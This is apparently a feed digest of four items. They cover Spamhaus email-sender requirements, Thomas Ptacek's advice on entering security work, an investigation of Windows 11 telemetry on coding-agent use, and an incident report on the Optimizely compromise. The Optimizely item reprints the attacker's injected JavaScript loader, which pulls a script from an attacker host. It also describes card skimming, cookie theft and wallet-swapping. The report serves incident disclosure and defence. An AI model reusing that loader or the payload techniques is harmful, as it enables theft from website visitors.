item.title: Spamhaus new email sender requirements in November
item.description:
Spamhaus Sender GuidelinesRequirements and recommendations to help email senders follow best practices and strengthen trust and safety on the internet.

Starting in November 2026, we are gradually rolling out a requirement for every sending IP to have a valid HELO, a reverse DNS (PTR) record, and a matching A record. Use the HELO checker below to see whether the DNS meets our best practices, and follow the guidelines to avoid being listed.

Minimum requirements

Guidance for senders, mail admins, and postmasters on meeting Spamhaus's sending requirements. All senders must meet these minimum email sending requirements to avoid being listed.

Use confirmed opt-in (COI) for all subscribers

Each recipient should confirm their address by clicking a link in a confirmation email. If no confirmation is received, do not send email to that address. Purchased, rented and harvested lists are the most common source of spam trap hits, and hitting traps is one of the fastest routes to a listing. See section

Publish forward-confirmed reverse DNS for every sending IP

Every sending IP must have a reverse DNS entry pointing to a fully qualified domain name (FQDN). That hostname must, in turn, resolve back to the same sending IP address. This is known as forward-confirmed reverse DNS (FCrDNS). An IP with missing or mismatched reverse DNS is treated as suspicious and is one of the most common reasons for an IP to be considered for listing. See section

Use a HELO/EHLO hostname that resolves to the sending IP

The hostname the server announces in the HELO/EHLO command must resolve to the IP it is connecting from, and must stay consistent across connections from that IP. Placeholder values, hosting-provider defaults, and hostnames that vary between connections are treated as signals of misconfiguration or compromise and can result in a listing. See section

Meet the IPv6 allocation and reverse DNS minimum

If sending over IPv6, the sending address must fall within an allocation of /64 or larger (a /64 is the standard block size we recommend assigning), and that space must have valid reverse DNS. IPv6 ranges without reverse DNS or with allocations smaller than /64 are often misused by spammers. See section

Authenticate mail with SPF, DKIM and DMARC

Publish SPF and DMARC records for every sending domain, sign every outbound message with a signature, and align the DKIM sending domain with the domain in the message's RFC 5322 From address. Authentication is one of the signals that shapes reputation, so gaps here make a listing more likely when other signals are weak. See section

Operating an Email Server Provider (ESP) or other shared sending infrastructure? See the ESPs and Large Senders guidelines

1. Infrastructure and DNS

All sending infrastructure must have the following DNS and mailserver configuration. Failure to do so can result in IPs being listed on the Email Spam IPs (CSS) or compromised IPs (XBL) zones.

Do

Ensure the sending IP address has a valid reverse DNS (rDNS) entry resolving to a fully qualified domain name (FQDN) for the sending IP address. Spamhaus will treat emails originating from IP addresses without rDNS as suspicious and this will be reflected in the IP's reputation, and receivers using Spamhaus data may subject it to additional filtering.

Ensure the rDNS hostname resolves to the connecting IP address via a corresponding forward DNS (A/AAAA) record.

Abusive actors often rely on the reputation of upstream DNS records to hide their identity. Instead, configure a branded reverse DNS to use the sender's own domain, to improve trust signals for the IP address.

Don't

Do not use generic or auto-generated rDNS entries for dedicated IPs that point to the hosting provider (e.g., static-203-0-113-25.hosting.example.net, 203.113.0.25.broadband.example.net, vps-25.dedicated.hosting.example.com etc). These can negatively impact reputation.

Do not use random dictionary words in the rDNS and make it identifiable to the sending infrastructure.

How to check

Use the Spamhaus DNS checker tool to check your rDNS configuration.

Do

Ensure the hostname used in the HELO/EHLO command resolves to the sending IP address.

Maintain a consistent HELO value that resolves to the sending IP address. Multiple HELO values resolving to different IP addresses may indicate residential proxy and/or malware behaviour.

Where possible, ensure the HELO/EHLO hostname is consistent with the rDNS hostname.

Host a webpage on the domain of the HELO, that explains what the domain is for, or that redirects to the main brand domain.

Don't

Do not use placeholder values such as localhost or generic hostnames that point to the hosting company/ISP as the HELO value.

Do not resolve HELO hostname to infrastructure that is not used for sending â this behaviour is associated with spoofing and misconfiguration.

Do not use generic or auto-generated names provided by the hosting provider, use the sender's own domain where possible.

Do not impersonate the HELO value of well-known mailbox providers like Gmail or Hotmail.

How to check

Enter an IP address into the Spamhaus DNS Checker at the top of this page, to check its HELO value. An email can also be sent to helocheck@abuseat.org to check the HELO being used.

Do

IPv6 customer allocations must be at least /64 and must have valid reverse DNS. The /64 minimum is consistent with IPv6 subnet architecture and RFC 6177's guidance that email senders should be able to obtain at least a /64. This is further discussed in M3AAWG best practices for IPv6 allocation.

Add routes for all IP space owned by the sender to reduce vulnerability to BGP hijacking, which can allow hackers to send email that appears to originate from the IP space.

How to check

Run dig -x <an IPv6 address in the allocation> to confirm reverse DNS is present. To confirm the space is actually routed, look the address up at bgp.he.net.

Do

Don't

Do not allow freemail addresses such as gmail.com or hotmail.com as the 'Envelope FROM.'

Do not use the NULL envelope sender <> for anything other than indirect out-of-band delivery reports, DSNs and MDNs.

Do not send bounce messages after accepting unwanted mail. Reject it during the SMTP transaction instead. Bounces sent to forged senders are known as backscatter, which is indirect spam and can severely harm reputation.

How to check

Run dig TXT <envelope sender domain> and confirm an SPF record is returned and includes the sending IPs.

Do

Audit DNS regularly and remove records for services, hosts and IP space that are no longer used, including CNAMEs, NS delegations, A records and SPF include: entries for former providers.

Don't

Do not leave records pointing to decommissioned hosts or former providers. Dangling records can be claimed by others and used to send mail that appears to come from the domain.

Do not use wildcard DNS records.

This article explains domain, hostname terminology and domain alignment in email. Also, use aboutmy.email to check for email configuration setup.

How to check

Run dig against the subdomains and look for CNAMEs that resolve to a provider that no longer serves the domain.

2. Authentication

Authentication is how receiving mail servers verify that emails are authorized to send from the domain. Without SPF, DKIM, and DMARC properly configured, the domain is exposed to spoofing and phishing, and emails are more likely to be rejected or flagged by Spamhaus.

Do

Publish an SPF TXT record in the domain's DNS zone file that specifies exactly which IPs and hosts are authorized to send email on the domain's behalf.

Ensure the sending IP is explicitly included in the SPF record. Email sent from IPs not included in SPF will not pass SPF checks.

Make sure both the HELO domain and the envelope From domain have a valid SPF record. Publish SPF records on this domain (which might be the infrastructure domain) and not the visible header From domain.

Keep the SPF record within the 10 DNS lookup limit (this includes all nested include: statements). Exceeding the limit returns a PermError, which is not a pass, so SPF cannot authenticate mail or satisfy DMARC alignment.

Keep the SPF record as narrow as possible. Only include the sending infrastructure actually in use.

Don't

Do not use overly permissive qualifiers like +all or broad include: ranges that authorise IP space not under the sender's control.

Do not leave include: statements for providers no longer used for sending. Audit the SPF and remove outdated vendors. Check for typos.

Avoid using SPF macros unless needed. They are expanded per message at evaluation time, which is costly and makes failures more likely.

Do not use a or mx mechanisms where ip4: or ip6: would work. Each one costs a DNS lookup against the limit of 10, while ip4: and ip6: cost none.

How to check

Run dig TXT <domain>, then count the mechanisms that trigger a DNS lookup â include, a, mx, ptr, exists and redirect â and confirm the total is 10 or fewer.

Do

Ensure every outbound message carries a valid DKIM signature, using a minimum 1024-bit key length while 2048-bit is recommended.

Ensure that the d= domain on the DKIM signature matches the domain on the header From.

Rotate DKIM keys at least annually, or immediately if a key is suspected to be compromised.

Use a different d= domain for different mailstreams (for example, separate subdomains for transactional and marketing email), so that each mailstream builds its own reputation.

How to check

Run dig TXT <selector>._domainkey.<domain> (the selector is set in the ESP's DKIM setup page) and confirm a DKIM key, starting v=DKIM1, is returned.

Do

Publish a DMARC record with a policy defined for the sending domain.

Ensure the header From domain aligns with the DKIM signing domain (d=) so that DMARC alignment passes.

Set up a DMARC aggregate report address (rua=) from day one as this will help audit email sent from the domain.

Don't

Do not remain at p=none permanently. Starting with p=none is acceptable, but we recommend having an enforcement policy.

How to check

Run dig TXT _dmarc.<domain> and confirm a DMARC record, starting v=DMARC1, is returned.

3. Permission and List Hygiene

Send email only to people who want to receive it. Once the technical infrastructure is in place, the next step is building a legitimate list of email addresses from people who have provided explicit permission to receive the email. Lack of permission is one of the most common reasons for being listed by Spamhaus.

Do

Ensure all bulk email is ONLY sent to recipients that have Confirmed Opt-in (COI). Send a confirmation email requiring recipients to explicitly opt-in to verify their email address. This will prevent unwanted signups, bot signups and typo email addresses. If no opt-in is received, do not send email to that address.

Utilise available signals like bounce data, feedback loops, postmaster tools and engagement data to ensure the mailing list is up to date and email is sent to an engaged audience.

Keep a timestamped record of when and how permission was obtained.

Don't

Do not send emails to purchased, rented, or harvested lists, as these are the most common source of spam trap hits.

Permission is NOT transferable. Do not grant or assume permission retroactively or transfer it between organisations or domains.

How to check

Look for high bounce rates, low engagement and unusual sign-up patterns in the mailing platform.

Do

Refer to the guidelines from M3AAWG for managing spamtraps, and follow the best practices outlined in our resources.

Implement a robust email sunset policy to help remove temporary email sign-ups and email addresses that no longer engage with email.

Don't

Do not attempt to identify or suppress a spam trap address. Audit the acquisition process to identify which list segment or collection method introduced the problem address, and remove that source entirely.

Spamhaus spamtraps do not subscribe to email or engage with them.

According to M3AAWG spam trap best practices, mailboxes that remain inactive for more than 12 months can be repurposed as spamtraps.

4. Sending best practices

How email is sent matters as much as what is sent. Warming the IP and domain, maintaining a consistent volume, using trusted links and domains within emails, and providing clear, legitimate ways to opt-out of emails will help improve overall deliverability.

Do

HELO domains which DO NOT have a sending history will be subjected to additional filtering. Please read our best practices around IP/Domain warm-up.

Start sending slowly, and consistently for any IP address or domain that has not sent email in the past 90 days, before gradually increasing volume.

Domains which have been registered in the past 24 hours will be part of Spamhaus Zero Reputation Domains (ZRD) list.

Additionally, domains used for mailing within 30 days of registration will be treated suspiciously and we recommend following best practices for newly registered domains.

Treat any change in IP or HELO hostname as a new asset if no prior sending history is available, and apply the same warm-up process as used for a new IP or domain.

Begin with a few initial campaigns sent to the most engaged recipients to reduce the risk of hitting older invalid addresses. Maintaining a slow and consistent email volume will help build a strong sender reputation.

Don't

Do not use warm-up services that generate artificial traffic or simulate opens, clicks and replies. Using an engagement inflation service will result in the IP or domain being listed.

Infrastructure operated to inflate engagement or otherwise trick filters will be listed as a spam-enabling service.

Do not send inconsistent email volumes or trigger a sudden spike in sending, as this could negatively impact reputation.

Do not send to addresses which are old and unengaged while warming the IP or Domain.

Do not send the entire daily volume in a single burst at the top of the hour. Spread it across the day as spikes in mail volume can look suspicious.

Do not use more IPs than required to manage the mail volume as this can be perceived as snowshoe behaviour.

Do not begin sending on new infrastructure without carrying the suppression list across. Addresses that previously bounced or unsubscribed will otherwise be mailed again, and old inactive addresses are where recycled spam traps sit.

How to check

Plot the daily send volume for the IP or domain against the warm-up schedule and confirm it is increasing gradually, not spiking.

Do

Keep the overall bounce rate below 5%.

Suppress hard bounces immediately.

Investigate and remove repeated soft bounces after a defined threshold; this is typically 3â5 consecutive bounces.

Don't

Avoid using email list validation as a source to clean spamtraps as it does not do so, and is not and never will be a replacement for permission.

Do

Bulk commercial senders: Implement the List-Unsubscribe-Post: List-Unsubscribe=One-Click header enabling one-click unsubscribe directly from the inbox (RFC 8058).

Include a clearly visible unsubscribe link in the body of every commercial email.

Action unsubscribe requests within 2 days and add them to a suppression list.

Don't

Do not hide or obfuscate unsubscribe links.

Do not require recipients to authenticate to unsubscribe.

Avoid use of one-click unsubscribe in the body of an email; instead, make sure the link leads to a confirmation page.

How to check

Send a test campaign to a test mailbox, open the message headers (e.g. Gmail's "Show original"), and confirm that List-Unsubscribe and List-Unsubscribe-Post are both present. Also check that all links in the email work.

Do

Use HTTPS for all links, and only use links generated by the sender's own system.

Sign or validate tracking and redirect links so they cannot be altered to point elsewhere. This prevents malicious actors from abusing them as open redirects.

Don't

Do not use free or unbranded URL shorteners in the content of an email. URLs and/or domains used in the content of an email will affect the overall reputation of the sending domain.

5. IP and Domain Reputation

The reputation of the IP and domain as seen by Spamhaus can be checked via our reputation checker.

Spamhaus looks at multiple signals before assigning a reputation score, and a strong negative signal can outweigh the absence of positive ones â so following all email best practices consistently is essential.

Factors that influence reputation include: the service provider, the IP neighbourhood, the infrastructure the IPs are associated with, the upstream networks that connect to internet backbones, and the IP or domain's history â when it was first seen, when it was last used, and how it was used.

Do

Check the IP reputation and domain reputation regularly and do not wait for a delivery issue or listing to discover an issue.

Associate the domain with network providers and registrars that maintain a good reputation. The reputation of the hosting provider or registrar can be checked on our reputation statistics page.

Ensure newly registered domains are not used for at least 30 days from registration. The domain can be used for non-email purposes during this period, and establishing a web-presence prior to sending email will help improve the credibility of the domain.

Refer to our recommendations for best practices when using newly registered domains.

Don't

Do not use newly registered domains in SMTP as a FROM domain or a HELO domain unless the domain is properly warmed up. Similarly, using a newly registered domain in the content of the email can also look suspicious. The age of the domains used in the email can affect the overall sending reputation.

Do not use cousin domains for additional mailstreams or geographies for the same brand. Use sub-domains.

Do not hide WHOIS information for the root sending domain. The reputation of the upstream provider may be used for evaluating domain reputation. The reputation of the upstream provider can be checked in our Registrar reputation page.

How to check

Run the domain through the Reputation Checker to get more insights.

Note: We do not accept requests for explanations of the attributes shown here or requests to reset reputation.

6. ESPs & Large Senders

ESPs and shared infrastructure hosts are responsible for the email sent via their infrastructure. Hosting abusive senders will negatively impact the reputation of shared domains and infrastructure.

item.title: How to Break into Security, Ptacek Edition (2012)
item.description:
At least once a month, sometimes more, readers write in to ask how they can break into the field of computer security. Some of the emails are from people in jobs that have nothing to do with security, but who are fascinated enough by the field to contemplate a career change. Others are already in an information technology position but are itching to segue into security. I always respond with my own set of stock answers, but each time I do this, I can’t help but feel my advice is incomplete, or at least not terribly well-rounded.

I decided to ask some of the brightest minds in the security industry today what advice they’d give. Almost everyone I asked said they, too, frequently get asked the very same question, but each had surprisingly different takes on the subject. Today is the first installment in a series of responses to this question. When the last of the advice columns have run, I’ll create an archive of them all that will be anchored somewhere prominently on the home page. That way, the next time someone asks how they can break into security, I’ll have more to offer than just my admittedly narrow perspectives on the matter.

Last month, I interviewed Thomas Ptacek, founder of Matasano Security, about how companies could beef up password security in the wake of a week full of news about password leaks at LinkedIn and other online businesses. Ptacek’s provocative advice generated such a huge amount of reader interest and further discussion that I thought it made sense to begin this series with his thoughts:

Ptacek: “Information security is one of the most interesting, challenging, and, if you do it carefully, rewarding fields in the technology industry. It’s one of the few technology jobs where the most fun roles are well compensated. If you grew up dreaming of developing games, the laws of supply and demand teach a harsh lesson early in your career: game development jobs are often tedious and usually pay badly. But if you watched “Sneakers” and ideated a life spent breaking or defending software, great news: infosec can be more fun in real life, and it’s fairly lucrative.

I’m a software developer. I try to look at security through the lens of computer science. To me, the most attractive thing about the field is the opportunity it provides to work with lots of different concepts at lots of different levels. Computer security might be the best way to work professionally with compiler theory, or to spend time understanding computer microarchitecture, or to apply advanced mathematics.

Other people get involved in security for different reasons, and those reasons are probably equally valid. Some people really like the “good guys / bad guys” narrative that comes with security. Some people see security as an opportunity to save the world. Other people are drawn to the competitive nature of the field: at the higher levels, it really is a cat-and-mouse game. It also comes closer to meritocracy than most of technology: you can either break in or you can’t; your defenses either work or they don’t.

But for me, it’s just one of the best development jobs you can get, and with that in mind, here’s my advice for people interested in pursuing a career in it.

First: I want you to learn how to program. Clearly, you can get through college and get a good-paying steady job without ever learning to love programming. But no one factor gives you as much control over your career, as much of an ability to write your own ticket, as the ability to solve problems using programming languages. A lot of very smart technology professionals have concluded that they just don’t enjoy writing software. Those people should reconsider. Try different languages, or different application domains, but find a way to make programming stick in your head.

Second: the best jobs in our field are in application security. You can get good steady work designing firewall deployments, setting up desktop agents, or responding to incidents. But all those roles are fundamentally reacting to what’s happening in appsec. The next generation of security products — along with the org charts of security teams at the savviest companies — are being designed now, by accident, by application security practitioners.

Appsec roles are roles that involve attacking software or devising fixes and countermeasures for those attacks. Two good ways to “come up” in appsec: become a penetration tester, or contribute to (or start) a secure software development practice in your company.

A good way to move into penetration testing: grab some industry standard tools and use an Amazon EC2 account to set up a “shooting range” to attack. Some of the best-known tools are available for free: the Nessus scanner, for instance, while not an application security tool, is free and can land you a network penetration testing role that you can use as a springboard to breaking applications.

When people reach out to Matasano asking how to get a foot in the door attacking software, we have a few simple steps to offer:

0. Learn to love programming in at least one language. The C Programming Language has the most cachet in application security, but for this step-by-step list, Java or Python or Ruby will do fine.

1. Grab a copy of The Web Application Hacker’s Handbook.

2. Go to the “previous releases” archive at WordPress.org and grab very old versions of WordPress; install them at EC2.

3. Download OWASP WebScarab or Burp Suite Free Edition, both of which are free, and use them to find bugs in ancient WordPress.

If you’re already in an IT role, and want to come up on the defensive side of appsec, try to position yourself near custom software development. Most large firms build “line of business” applications. As a rule, building “line of business” isn’t particularly fun. But defending those apps can be; sometimes, the most boring applications turn out to be surprisingly sensitive.

And the good news for doing appsec in BigCo’s: most companies have very immature security programs. If you can get a role in QA, or in what the cool kids are calling “DevOps”, you can end up with a lot of influence in security. At Matasano, we’ve watched lots of ops people successfully transition to appsec and senior security management just by instituting basic security testing processes on their company’s software.

To me, the whole field boils down to studying, understanding, and manipulating technology. Like most software security practices, we’ve gotten our hands dirty with a fascinating cross-section of the whole technology industry. We’ve written attack tools that target the control registers of device chipsets, we’ve done custom RF work, we’ve written low-level debuggers for different CPU architectures, and we’ve seen and beaten up on products built in almost every programming language and every platform you can imagine. If crawling through the ventilation ducts of the world’s most important technology is something you think might make you tick like we do… well, appsec! Learn to code. Spend a couple days Starbucks money on an EC2 account and deploy some broken apps to break. Find opportunities to practice in your job.

And, uh, come talk to us? People like you are hard to find!”

item.title: Windows 11 is collecting data on which coding agents and developer tools you use
item.description:
7 minutes

Windows 11 Is Collecting Data on Which Coding Agents and Developer Tools You Use

I recently asked AI to help me look through the latest Windows binaries for undocumented features and functionality. Among the leads it turned up, one list immediately caught my attention: coding agents such as codex.exe, claude.exe, copilot.exe, and cursor.exe, alongside familiar developer tools such as python.exe, dotnet.exe, gcc.exe, and code.exe.

Why would a Windows system DLL need a list of coding agents and developer tools?

The names were in MissionControlAggregator.dll. I asked the agent to follow the references and dig into what the DLL actually does. That led from a handful of string comparisons to a running Windows component that records which coding agents and developer tools have been used, saves that information locally, and reports it to Windows Diagnostics. And unless you have opted out of the “optional” diagnostic data (which is enabled by default), the data is uploaded to Microsoft.

I shared the initial finding on X. This post includes more details about the investigation behind it.

Following the names

Opening the DLL in Binary Ninja made the first lead easy to see. These were explicit executable names embedded in a Windows component:

Following the references showed that the names were used in comparisons. There are four CLI-agent slots checking copilot.exe, claude.exe, codex.exe, and agy.exe, with extensionless equivalents on the WSL route. Five desktop-agent slots check github.exe, claude.exe, codex.exe, cursor.exe, and antigravity.exe.

Here is one of the comparisons against codex.exe:

The compiler-generated C++ names are unwieldy, so I will call these functions executable-name matchers. For reference, one related matcher is std::_Func_impl_no_alloc<<lambda_340dfe7e962ab225b6ac33bc664bd54f>, bool, std::basic_string_view<wchar_t, std::char_traits<wchar_t>> const&, Microsoft::Diagnostics::MissionControlAggregator::Utils::AppType>::_Do_call. The screenshot shows another lambda instantiation performing the same kind of name comparison.

The feature guarding the new agent checks has a particularly direct name: CLICodingAgentUsage, feature ID 62580080.

And the list extends beyond AI agents. The same component checks for node.exe, python.exe, dotnet.exe, gcc.exe, clang.exe, gdb.exe, javac.exe, devenv.exe, and code.exe, among others. Those checks feed broader developer-tool categories. Some of these checks also verify the publisher: the Node.js slot expects Node.js Foundation, Python expects Python Software Foundation, and the .NET and Visual Studio slots expect Microsoft Corporation. The compiler/debugger group containing GCC and Clang has no additional publisher check in this path.

Where does the DLL get this information?

The next question was whether the component scans running processes itself. Following Aggregator::OnLoad revealed that it subscribes to existing Windows events instead.

For Windows programs, it consumes KernelProcess.AppStateChangeSummary and Win32kTraceLogging.AppInteractivitySummary. These provide application identities that its handlers parse and pass to the matchers. For WSL, it consumes Microsoft.Windows.Lxss.Manager.Exec and ExecCritical, using the imageName field. A regular Windows codex.exe can therefore reach the CLI-agent checks through the app-state summary route; this is not limited to Linux programs running inside WSL.

The relevant flow looks like this:

Aggregator::OnLoad ├─ WSL Exec / ExecCritical │ └─ ProcessWslExecEvent → CLI agent matchers ├─ KernelProcess.AppStateChangeSummary │ └─ ProcessAppStateChangeSummaryEvent → CLI agent matchers └─ Win32kTraceLogging.AppInteractivitySummary └─ ProcessAppInteractivitySummaryEvent → desktop agent matchers Aggregator::OnRelativeTimerExpire └─ MissionControlAggregatorLogging::ReportCohorts<12,4,5> └─ Segments.SubCohorts ETW report Aggregator::OnUnload / intermediate timer └─ PersistentState::SaveToDisk

A successful match sets a slot in the aggregator’s state. Later, ReportCohorts<12,4,5> turns those slots into bitsets and emits a report named Segments.SubCohorts. The numbers correspond to twelve broader tool categories, four CLI agents, and five desktop agents.

ETW (Event Tracing for Windows) is the mechanism carrying that report. In this case, it is a self-describing TraceLogging event. Rather than writing the executable names into every report, the component assigns each category a bit. A set Codex bit means the matching tool was observed during the reporting window.

The source events also include runtime, time in focus, interaction counters, and resource usage. This component appears to discard those details and record only a bitmap of which agents were observed. The report’s timestamps describe the collection window, not how long each agent was used.

Although I found no prompt text or source code in this report, collecting which agents and developer tools someone uses already has significant privacy implications.

Is it actually running on a normal machine?

Strings and code are a useful lead, but I wanted to see the component running. I checked my Parallels Windows 11 ARM64 VM, build 26200.9974. Its MissionControlAggregator.dll was version 10.0.26100.9818, and CLICodingAgentUsage was already enabled as a service experiment. I had not manually enabled the feature.

DiagTrack, the Connected User Experiences and Telemetry service, was also already running with its startup type set to Automatic. It starts a separate AggregatorHost.exe process, and that process loads the DLL. The following administrative PowerShell commands show the service, its child process, and the loaded module:

PS> Get-Service DiagTrack | Format-Table Name,Status,StartType -AutoSize Name Status StartType ---- ------ --------- DiagTrack Running Automatic PS> Get-Process AggregatorHost | Format-Table ProcessName,Id -AutoSize ProcessName Id ----------- -- AggregatorHost 1500 PS> Get-CimInstance Win32_Service -Filter "Name='DiagTrack'" | Format-List Name,State,StartMode,ProcessId Name : DiagTrack State : Running StartMode : Auto ProcessId : 10148 PS> Get-CimInstance Win32_Process -Filter "Name='AggregatorHost.exe'" | Format-List ProcessId,ParentProcessId ProcessId : 1500 ParentProcessId : 10148 PS> tasklist /m MissionControlAggregator.dll Image Name PID Modules ========================= ======== ============================================ AggregatorHost.exe 1500 MissionControlAggregator.dll

The process IDs connect the pieces: DiagTrack runs in process 10148, which is the parent of AggregatorHost.exe, process 1500; the module listing places MissionControlAggregator.dll inside that child.

The public ISO’s baseline VM had the coding-agent feature disabled by image default, so the evidence does not support saying that it is active on every Windows installation. On my ARM64 VM, however, the relevant feature and service were active before the test.

Testing it in practice

To test the finding in practice, I copied cmd.exe to a file named codex.exe and ran it in the interactive Windows session. The name alone was enough for the component to recognize it as Codex.

I captured an AppStateChangeSummary for the running process from the KernelProcess provider ({2839ff94-8f12-4e1b-82e3-af7af77a450f}), with LaunchCount=1 and TerminateCount=0. The aggregator’s saved state contained the value 2 in CLI slot 2, the Codex slot. A separate run without an additional ETW trace also set that slot, confirming that detection worked through Windows’ existing diagnostic collection.

That state is persisted in:

C:\ProgramData\Microsoft\Diagnosis\AggregatorStorage\MissionControlAggregator$

The report normally follows a roughly daily boundary. To capture it immediately, I temporarily moved the saved reporting-window start 25 hours into the past and restarted DiagTrack with a trace listening for the aggregator. The resulting Segments.SubCohorts event contained:

Provider: Microsoft.Windows.MissionControlAggregator Time: 2026-11-16T12:34:29.125116Z Version: 0.1.5 CliAgentSubCohorts: 4 DesktopAgentSubCohorts: 0 FlushedFromSave: true

The value 4 is 1 << 2: the Codex CLI bit. The name had made it through the input summary, the matcher, the persisted state, and the emitted report.

I also tested the developer-tool path separately, using a copy of cmd.exe named gcc.exe. It set developer-tool slot 3. With optional diagnostic data allowed, I found the resulting Segments.SubCohorts event in DiagTrack’s upload queue with SubCohorts: [8] (1 << 3). This is the compiler/debugger category shared by GCC, Clang, and related tools, rather than a separate bit for each executable.

Following the report toward Microsoft

An ETW event by itself would not establish that anything leaves the machine. ETW is used for plenty of local diagnostics. The more revealing question was who was listening to this particular report.

The VM already had a Diagtrack-Listener session subscribed to both ends of the path. These PowerShell queries showed its subscriptions:

Get-EtwTraceProvider -SessionName Diagtrack-Listener ` -Guid '{2839ff94-8f12-4e1b-82e3-af7af77a450f}' Get-EtwTraceProvider -SessionName Diagtrack-Listener ` -Guid '{00de11a2-ec06-58e5-1a2b-21bb21dbee4b}'

The first subscription, for KernelProcess, had MatchAnyKeyword=0x400000000002, which includes the summary’s 0x400000000000 keyword. The second, for Microsoft.Windows.MissionControlAggregator, had MatchAnyKeyword=0xe00000000000, which includes the report’s 0x800000000000 keyword. Both had level 255.

The subscription showed where the report could go. To check whether Windows actually queued it for transmission, I inspected DiagTrack’s EventStore.db and decompressed the JSON batches in its AsimovEvents table. This revealed an important condition: the agent-usage report is treated as optional diagnostic data.

When optional diagnostic data is allowed (enabled by default in the US setup I tested), Windows queues the coding-agent usage report for upload to Microsoft. I verified this by finding the agent event itself in DiagTrack’s upload queue:

{ "name": "Microsoft.Windows.MissionControlAggregator.Segments.SubCohorts", "ext": { "privacy": { "isRequired": false } }, "data": { "Version": "0.1.5", "CliAgentSubCohorts": [4], "DesktopAgentSubCohorts": [0], "FlushedFromSave": true } }

I checked this with a clean installation of Windows 11 Home ARM64 using the latest official ISO, with the region set to the United States. Before changing any privacy settings, the Diagnostic data toggle was already enabled and labeled Include Optional. After completing setup with those defaults, AllowTelemetry was 3, confirming that optional diagnostic data was enabled.

Optional diagnostic data is therefore enabled by default, at least in the US setup I tested. If you did not opt out of it during installation or disable optional diagnostic data later, it is still enabled and your coding agent usage data is being uploaded. You can decline optional diagnostics during setup or turn off Send optional diagnostic data later under Settings → Privacy & security → Diagnostics & feedback. Microsoft’s diagnostics and privacy guide explains how to change it.

item.title: Optimizely compromised, served malware on Zoom, GitLab
item.description:
World's Largest Brands Infected With Malware Via Optimizely

On 16 November 2026, malicious JavaScript was served to visitors of 178 organisations through the Optimizely Web experimentation platform. The list includes some of the most visited sites in the world: Zoom, the BBC, CNN, Salesforce, GitLab, IKEA, HSBC, Equifax, Air France-KLM, Ledger and Peacock.

The malware was a multi-purpose kit. It swapped cryptocurrency wallet addresses for the attacker's, skimmed payment cards, stole cookies and screenshots, and on iPhones and iPads it delivered the Coruna and DarkSword iOS exploit kits. Crypto has already been stolen, with verified transactions to the attackers.

This is exactly the kind of attack Report URI is designed to detect. Our platform can identify unexpected changes to trusted JavaScript, detect new scripts being loaded and reveal suspicious connections to external destinations. In this case, those signals would have exposed the malicious activity, even though the original script was being served from a trusted Optimizely domain. With an appropriate CSP in enforcement mode, organisations could have gone a step further and blocked key parts of the attack before they succeeded.

The important lesson here is that trusted JavaScript doesn't always remain trustworthy. A website can be compromised through a third-party dependency without its own code or infrastructure ever being breached.

Most of the malicious code has now been removed. At 21:52 UTC we found it in only 1 of the 188 infected snippets, down from 169 at 20:56 UTC. If your site uses Optimizely Web, or you visited any of the sites below today, read on.

What happened

Optimizely Web works by having each customer load a JavaScript "snippet" from Optimizely's CDN, for example https://cdn.optimizely.com/js/6395285578973184.js. The snippet contains Optimizely's code, the customer's experiments and an optional field called Project JavaScript (projectJS): custom code the customer writes in their Optimizely dashboard, which runs on every page.

The attacker wrote their own code into the Project JavaScript of customer projects, and the rest of each snippet was untouched. The file was still served from cdn.optimizely.com, with Optimizely's certificate, from a host that every affected site already trusted. Here is what was added to Zoom's snippet:

"projectJS": function(){(function(){try{var s=document.createElement('script');s.src='https://1688360.cc/track.js';s.async=true;(document.head||document.documentElement).appendChild(s);}catch(e){}})();

We saw three versions of the injected loader:

A plain <script> tag pointing at https://1688360.cc/track.js (most snippets). The same URL hidden in base64 with atob(). A search for "1688360.cc" won't find it. Smartsheet's snippet was cleaned at one point and then re-infected with this version, so whoever wrote the code still had access at the time. A full inline copy of the payload, which runs through eval if 1688360.cc is blocked.

Some customers serve their snippet from their own domain, such as opt.scheels.com/js/<id>.js or www.vodafone.com.au/js/<id>.js. Those were affected too, because the content comes from the same Optimizely project.

We don't know how the attacker got write access to so many unrelated customer projects: a compromised Optimizely system, a compromised credential with cross-customer access, or something else. That's for Optimizely to explain. To be clear, Optimizely's CDN served exactly what it was given; this was not a CDN cache-poisoning attack. Optimizely's own sites were affected as well: the snippets for www.optimizely.com and login.optimizely.com both carried the code.

Timeline (UTC) Time Event Sep 17 webshell.lol, the same actor's injector, first appears on Turkish sites through an SEO "backlink panel" script Nov 09 17:52 5vobauua3ojpklx.icu registered (iOS exploit-kit router) Nov 13 to 11-16 Earlier wave: webshell.lol/get.js injected through Kissmetrics, StorifyMe and Minute Media scripts on sites including securitybank.com, faz.net, smh.com.au, vidaxl and foxsports.com Nov 16 02:21 Last clean urlscan capture of the BBC's Optimizely snippet Nov 16 04:21 First Optimizely injection seen (BBC snippet loading webshell.lol) 04:28 to 05:23 1688360.cc certificates issued; domain registered at 05:23 08:10 First build of track.js (crypto clipper) 08:28 1688360.cc/track.js first seen on bbc.com 11:20 Zoom's snippet modified (its Last-Modified header) 13:03 Attacker sweeps stolen crypto to exchanges 13:43 Card skimmer added to track.js 16:38 eil786npto9u5bq.icu registered (second iOS router) 17:13 to 17:57 Second iOS host added; Coruna iframe injected into every iOS 18.6-or-earlier visit 19:24 to 19:59 Our sweep: 186 of 1,611 Optimizely snippets infected ~20:40 to 21:10 Mass clean-up (Ledger 20:41, Smartsheet 20:56, BBC 21:07) 21:52 1 of 188 snippets still infected (TalkTalk)

The payload was rebuilt 26 times during the day. The attacker added features, and added wallets but never removed any.

What the payload does

Every visitor received the same script, track.js, and every part of it was active at once. What a visitor experienced depended on their device and what they did on the page.

1. Crypto address swapping (already stealing money)

The script finds any valid wallet address (BTC, ETH and EVM chains, TRON, Solana, TON, Litecoin, Bitcoin Cash, Dogecoin) and replaces it with one of the attacker's. It validates checksums so it only swaps real addresses. It swaps them in:

page text, form fields, links and images; the clipboard, on copy and through navigator.clipboard; outgoing fetch/XHR requests, window.open, navigation and the iOS share sheet.

It re-scans the page whenever it changes. Copy an address from any affected page, or from anywhere else while that tab is open, and you may paste the attacker's.

2. Card skimming

Added at 13:43 UTC. The script watches form submissions and every fetch/XHR POST for a card number (Luhn-checked), expiry date and CVV. When it has all three, it sends them to https://1688360.cc/card.php with navigator.sendBeacon. Cards entered in hosted payment iframes (Stripe, Adyen and similar) were out of its reach. Cards typed into a site's own form fields were not.

3. Cookie and screenshot theft

When it swaps an address next to wallet or payment wording, it sends the following to https://1688360.cc/hit.php:

the page URL; document.cookie (cookies not marked HttpOnly); the original addresses it replaced; a screenshot of the page, rendered with html2canvas. 4. iOS exploit kits: Coruna and DarkSword

